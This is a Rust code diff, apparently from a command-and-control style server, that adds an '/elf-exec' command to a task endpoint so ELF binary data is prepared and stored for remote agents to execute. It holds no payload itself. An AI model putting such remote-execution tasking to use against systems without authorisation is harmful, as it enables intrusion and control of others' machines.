@@ -105,6 +105,49 @@ pub async fn send_task(
         }
     }
 
+    if payload.command.trim().starts_with("/elf-exec ") {
+        log::info!("[+] ELF-exec command detected, storing ELF data...");
+
+        match CommandFormatter::prepare_elf_exec_data(&payload.command) {
+            Ok(elf_data) => {
+                log::info!(
+                    "[+] ELF-exec data prepared | size={} bytes | command_id={}",
+                    elf_data.len(),
+                    command_id
+                );
+
+                match state.database.store_pe_exec_data(command_id, &elf_data) {
+                    Ok(()) => {
+                        log::info!(
+                            "[+] ELF-exec data stored for command {} | size={} bytes",
+                            command_id,
+                            elf_data.len()
+                        );
+                    }
+                    Err(e) => {
+                        log::error!(
+                            "[!] Failed to store ELF-exec data for command {}: {}",
+                            command_id,
+                            e
+                        );
+                    }
+                }
+            }
+            Err(e) => {
+                log::error!(
+                    "[!] Failed to prepare ELF-exec data for command {}: {}",
+                    command_id,
+                    e
+                );
+
+                return HttpResponse::BadRequest().json(ApiResponse {
+                    success: false,
+                    message: format!("Failed to prepare ELF data: {}", e),
+                });
+            }
+        }
+    }
+
     if let Err(e) = state.database.log_agent_action(
         &payload.agent_id,
         "task_sent",
